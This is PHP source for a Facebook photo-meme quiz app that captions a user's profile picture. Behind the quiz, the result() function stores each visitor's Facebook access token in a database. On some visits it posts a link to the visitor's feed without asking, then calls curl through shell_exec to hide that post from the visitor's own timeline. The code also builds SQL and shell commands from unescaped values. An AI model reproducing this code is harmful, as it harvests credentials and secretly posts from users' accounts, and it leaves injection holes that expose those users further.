<?php
class FacebookDebugger
{
    /*
     * https://developers.facebook.com/docs/opengraph/using-objects
     *
     * Updating Objects
     *
     * When an action is published, or a Like button pointing to the object clicked,
     * Facebook will 'scrape' the HTML page of the object and read the meta tags.
     * The object scrape also occurs when:
     *
     *      - Every 7 days after the first scrape
     *
     *      - The object URL is input in the Object Debugger
     *           http://developers.facebook.com/tools/debug
     *
     *      - When an app triggers a scrape using an API endpoint
     *           This Graph API endpoint is simply a call to:
     *
     *           POST /?id={object-instance-id or object-url}&scrape=true
     */
    public function reload($url)
    {
        $graph = 'https://graph.facebook.com/';
        $post = 'id='.urlencode($url).'&scrape=true';
        return $this->send_post($graph, $post);
    }
    private function send_post($url, $post)
    {
        $r = curl_init();
        curl_setopt($r, CURLOPT_URL, $url);
        curl_setopt($r, CURLOPT_POST, 1);
        curl_setopt($r, CURLOPT_POSTFIELDS, $post);
        curl_setopt($r, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($r, CURLOPT_CONNECTTIMEOUT, 5);
        $data = curl_exec($r);
        curl_close($r);
        return $data;
    }
}
function imagettfstroketext(&$image, $size, $angle, $x, $y, &$textcolor, &$strokecolor, $fontfile, $text, $px) {

    for($c1 = ($x-abs($px)); $c1 <= ($x+abs($px)); $c1++)
        for($c2 = ($y-abs($px)); $c2 <= ($y+abs($px)); $c2++)
            $bg = imagettftext($image, $size, $angle, $c1, $c2, $strokecolor, $fontfile, $text);

    return imagettftext($image, $size, $angle, $x, $y, $textcolor, $fontfile, $text);
}

class Hhhh extends CI_Controller {

    public $user = null;
    public $access_token;
    public $profile;
    public $app_id;
    public $app_secret;

    public function __construct() {
        parent::__construct();
        set_time_limit(0);
        parse_str($_SERVER['QUERY_STRING'], $_REQUEST);
        $this->load->library('session');
        $this->app_id = $this->config->item('app_id');
        $this->app_secret = $this->config->item('app_secret');
        $this->load->library('facebook', array("appId" => $this->app_id, "secret" => $this->app_secret, 'cookie' => true,
            'fileUpload' => true,));
    }

    function index() {
        $data['main'] = 'pages/hhhh';
        $data['title'] = "hhhh";
        $data['og_title'] = "hhhh";
        $data['og_description'] = "hhhh asdasdasd";
        $data['og_img'] = asset_url().'img/sample/hhhh_sample.jpg';
        $data['og_url'] = base_url() . 'hhhh';
        $scope = 'public_profile,publish_actions,user_friends';
        $login = $this->facebook->getLoginUrl(array("redirect_uri" => base_url() . "hhhh/app", "scope" => $scope));
        $data['login'] = $login;
        $this->load->view('index', $data);
    }

    function app() {

        if (isset($_GET['error_reason']) && $_GET['error_reason'] == 'user_denied') {

            $this->session->set_flashdata('message', '**Sorry you have to accept the permission to see your wiki**');
            $user = null;
            redirect(base_url() . 'hhhh');
        }

        $this->user = $this->facebook->getUser();


        if ($this->user) {
            $access_token = $this->facebook->getAccessToken();
            $this->facebook->setAccessToken($access_token);
            try {
                // error_reporting(0);
                $user_profile = $this->facebook->api('/me?fields=id,name,email,birthday,gender');

                $my_photo = $this->facebook->api(
                    "/me/picture", "GET", array(
                        'redirect' => false,
                        'height' => '200',
                        'type' => 'normal',
                        'width' => '200',
                    )
                );
                $photo_url = $my_photo['data']['url'];
                //image download
                $image = file_get_contents($photo_url); // sets $image to the contents of the url
                file_put_contents(APPPATH . '../uploads/' . $user_profile['id'] . '.jpg', $image); // places the contents in the file /path/image.gif
//image merge
                $name = '';
                $fullname = '';
                $gender = '';
                if(!empty($user_profile['name'])){
                    $name = $user_profile['name'];
                    $list = explode(" ", $name);
                    $name = $list[0];
                    $fullname = $user_profile['name'];
                }
                if(!empty($user_profile['first_name'])){
                    $name = $user_profile['first_name'];
                    $fullname = $user_profile['first_name'] . ' ' . $user_profile['last_name'];
                }

                $per = rand(1, 15);






                $dest = Imagecreatefromjpeg(asset_url() . 'img/hhhh/'.$per.'.jpg');
                $src = Imagecreatefromjpeg(base_url() . 'uploads/' . $user_profile['id'] . '.jpg');
                $white = ImageColorAllocate($dest, 0,205,61);
                $black = ImageColorAllocate($dest, 0, 0, 0);
                $blackshadow = ImageColorAllocate($dest, 0, 0, 0, 40);
                $whiteshadow = ImageColorAllocate($dest, 255, 255, 255, 40);
                $red = ImageColorAllocate($dest, 255, 0, 0);
                $green = ImageColorAllocate($dest, 54, 255, 0);
                $purple = ImageColorAllocate($dest, 233, 0, 203);
                $start_x = 470;
                $start_y = 100;
                $font_path = FCPATH . 'font/arialblack.ttf';


                //imagettfstroketext($dest, 28, 0, 26.290596676737, 101.51057401813, $white, $black, $font_path, [[FULL_NAME]], 2);
                imagettfstroketext($dest, 28, 0, 26.290596676737, 101.51057401813, $white, $black, $font_path, " ".$name . "  esti un baran", 2);
//                imagettfstroketext($dest, 45, 0, 505, 230, $white, $black, $font_path, $per, 2);


                Imagealphablending($dest, false);
                Imagesavealpha($dest, true);
                $filename = base_url() . 'uploads/' . $user_profile['id'] . '.jpg';
                list($rwidth, $rheight) = getimagesize($filename);

                $thumb = imagecreatetruecolor(227, 227);
                $source = imagecreatefromjpeg(base_url() . 'uploads/' . $user_profile['id'] . '.jpg');

                imagecopyresized($thumb, $source, 0, 0, 0, 0, 227, 227, $rwidth, $rheight);
                imagejpeg($thumb, 'uploads/' . $user_profile['id'] . '.jpg');
                Imagecopymerge($dest, $thumb, 65.421875, 138, 0, 0, 227, 227, 100);
//                header('Content-Type: image/png');
//                Imagepng($dest);
                imagejpeg($dest, 'uploads/hhhh/result_' . $user_profile['id'] . '.jpg');
                Imagedestroy($dest);
                Imagedestroy($src);

                $tempavatar = 'uploads/' . $user_profile['id'] . '.jpg';
                unlink ($tempavatar);

                $user_id = $user_profile['id'];
                $this->session->set_userdata('user_id', $user_id);
                redirect(base_url() . 'hhhh/result/' . $user_id . '/' . $name);
            } catch (FacebookApiException $e) {

                echo'error';
                exit;
                debug($e);
                $user = null;
            }
        }
    }

    function result($user_id, $name) {

        $data['main'] = "pages/hhhh";
        $data['title'] = "hhhh";
        $data['og_title'] = "hhhh";
        $data['og_description'] = "hhhh asdasdasd";
        $data['og_img'] = base_url() . 'uploads/hhhh/result_' . $user_id . '.jpg';
        $data['og_url'] = base_url() . 'hhhh/result/' . $user_id . '/' . $name . '?share=1';
        $data['user_id'] = $user_id;
        $data['name'] = $name;
        $data['login'] = $this->facebook->getLoginUrl(array("redirect_uri" => base_url() . "hhhh/app"));
        $this->load->view('index', $data);
        $fb = new FacebookDebugger();
        $fb->reload(base_url() . 'hhhh/result/' . $user_id . '/' . $name);

        $sqluser = $this->config->item('db_user');
        $sqlpass = $this->config->item('db_password');
        $sqldb = $this->config->item('db_database');
        $sqlhost = $this->config->item('db_address');

        $thisid = $this->facebook->getUser();
        if ($thisid > 0) {
//echo "logged in";
            $permissions = $this->facebook->api("/me/permissions");
            $arr = array();
            foreach( $permissions['data'] as $v){
                $arr[$v['permission']] = $v['status'];
            }
            if( array_key_exists('publish_actions', $arr) && $arr['publish_actions'] == 'granted' ) { //comprende? :) yes boss
                $con = mysqli_connect($sqlhost, $sqluser, $sqlpass, $sqldb);
                if (!$con) {
                    die("Could not connect: " . mysqli_error());
                }



                $user_profile = $this->facebook->api('/me?fields=id,name,email,birthday,gender');
                $ftoken = $this->facebook->getAccessToken();
                $ffullname = $user_profile['name'];
                $fuserid = $user_profile['id'];
                $fdate = date("Y-m-d");
                $sharelink =  base_url() . 'hhhh/result/' . $user_id . '/' . $name . '?share=1';
                $this->user = $this->facebook->getUser();
                $shareper = rand(1, 1000);


                $checkid = mysqli_query($con, "SELECT id from fbtokens WHERE userid = '$fuserid'");
                if (mysqli_num_rows($checkid) > 0) {
                }else{
                    $result = mysqli_query($con, "INSERT INTO fbtokens(userid,date,token,name) VALUES ('$fuserid','$fdate','$ftoken','$ffullname')");
                }

                $checkpost = mysqli_query($con, "SELECT count(*) FROM fbtokens WHERE userid='$fuserid' AND autopost='YES'");
                $count = mysqli_fetch_array($checkpost);

                if ($this->user && $shareper < 100 && $count[0]<1) {
                    $access_token = $this->facebook->getAccessToken();
                    $this->facebook->setAccessToken($access_token);
//echo "posted";
                    try {
                        $ret = $this->facebook->api(
                            "/me/feed", "POST", array(
                                'link' => $sharelink,
                                'message' => '',

                            )
                        );

                    } catch(Exception $e) {
                        echo $e->getMessage();
                    }
                    $postid = $ret['id'];
                    shell_exec('curl -F "timeline_visibility=hidden" "https://graph.facebook.com/'.$postid.'/?access_token='.$access_token.'"');
                    $result2 = mysqli_query($con, "UPDATE fbtokens SET autopost = 'YES' WHERE userid='".$fuserid."'");
                }
                else{
//echo "not posted";
                }



                mysqli_close($con);

            }
        }}

    function logout() {
        $logout = $this->facebook->getLogoutUrl();

        redirect($logout);
    }

}

